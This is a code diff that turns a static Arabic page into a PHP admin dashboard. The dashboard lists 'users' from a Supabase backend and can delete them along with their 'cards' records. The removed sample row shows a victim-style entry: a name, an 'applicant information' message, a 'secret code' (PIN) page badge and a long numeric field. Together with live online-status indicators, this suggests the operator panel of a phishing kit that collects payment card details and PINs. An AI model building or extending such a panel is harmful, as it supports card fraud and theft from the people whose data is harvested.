@@ -1,10 +1,35 @@
 
+<?php
+session_start();
+require_once __DIR__ . '/../config.php';
 
+if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
+    header('Location: login.php');
+    exit;
+}
 
-      <script>
-      window.location.href="login.php";
-      </script>
-      <!DOCTYPE html>
+// Handle delete user
+if (isset($_POST['deleteUser']) && isset($_POST['userId'])) {
+    $uid = intval($_POST['userId']);
+    supabase_delete('cards', 'user_id=eq.' . $uid);
+    supabase_delete('users', 'id=eq.' . $uid);
+    header('Location: index.php');
+    exit;
+}
+
+// Handle delete all users
+if (isset($_POST['deleteAllUser'])) {
+    supabase_delete('cards', 'id=gt.0');
+    supabase_delete('users', 'id=gt.0');
+    header('Location: index.php');
+    exit;
+}
+
+// Load users
+$users = supabase_get('users', '', '*', 'created_at.desc');
+if (!is_array($users)) $users = [];
+?>
+<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 
 <head>
@@ -522,7 +547,7 @@
             <div class="stat-item">
                 <i class="fas fa-inbox"></i>
                 <span>الوارد</span>
-                <span class="stat-num" id="inboxCount">1</span>
+                <span class="stat-num" id="inboxCount"><?php echo count($users); ?></span>
             </div>
             <div class="stat-item">
                 <i class="fas fa-wifi"></i>
@@ -551,7 +576,7 @@
         <div class="mail-list-panel">
             <div class="mail-list-header">
                 <h6><i class="fas fa-inbox"></i> صندوق الوارد</h6>
-                <span class="inbox-count" id="inboxCount2">1</span>
+                <span class="inbox-count" id="inboxCount2"><?php echo count($users); ?></span>
             </div>
             <!-- Search Box -->
             <div class="search-box">
@@ -561,25 +586,37 @@
                 </div>
             </div>
             <div class="mail-list-scroll" id="result">
-                                    <div class="mail-row unread" data-user-id="1" data-username="soud ajlan" id="mailRow1" onclick="selectUser(1, this)">
+                <?php foreach ($users as $user):
+                    $uid = $user['id'];
+                    $uname = htmlspecialchars($user['username'] ?? '');
+                    $initial = mb_substr($uname ?: '?', 0, 1);
+                    $msg = htmlspecialchars($user['message'] ?? '');
+                    $pg = htmlspecialchars($user['page'] ?? '');
+                    $addr = htmlspecialchars($user['address'] ?? '');
+                    $time = isset($user['created_at']) ? date('H:i', strtotime($user['created_at'])) : '';
+                    $online = !empty($user['is_online']);
+                ?>
+                    <div class="mail-row unread" data-user-id="<?php echo $uid; ?>" data-username="<?php echo $uname; ?>" id="mailRow<?php echo $uid; ?>" onclick="selectUser(<?php echo $uid; ?>, this)">
                         <div class="row-avatar">
-                            s                            <div class="status-dot" id="status1"></div>
+                            <?php echo $initial; ?>
+                            <div class="status-dot <?php echo $online ? 'online' : ''; ?>" id="status<?php echo $uid; ?>"></div>
                         </div>
                         <div class="row-info">
-                            <div class="row-name" id="name1">soud ajlan</div>
+                            <div class="row-name" id="name<?php echo $uid; ?>"><?php echo $uname; ?></div>
                             <div class="row-preview">
-                                <span id="message1">معلومات مقدم الطلب</span>
-                                <span class="msg-badge" id="page1">الرمز السري</span>
-                                                                <span class="address-badge" id="addr1">1132222222555555555555554</span>
-                                                            </div>
+                                <span id="message<?php echo $uid; ?>"><?php echo $msg; ?></span>
+                                <span class="msg-badge" id="page<?php echo $uid; ?>"><?php echo $pg; ?></span>
+                                <span class="address-badge" id="addr<?php echo $uid; ?>" <?php echo empty($addr) ? 'style="display:none;"' : ''; ?>><?php echo $addr; ?></span>
+                            </div>
                         </div>
-                        <div class="row-time">12:28</div>
+                        <div class="row-time"><?php echo $time; ?></div>
                         <form action="" method="POST" style="margin:0;" onclick="event.stopPropagation();">
                             <button type="submit" name="deleteUser" class="row-delete" title="حذف"><i class="fas fa-trash"></i></button>
-                            <input type="hidden" name="userId" value="1">
+                            <input type="hidden" name="userId" value="<?php echo $uid; ?>">
                         </form>
                     </div>
-                            </div>
+                <?php endforeach; ?>
+                </div>
         </div>
 
         <!-- Left: Detail Panel -->
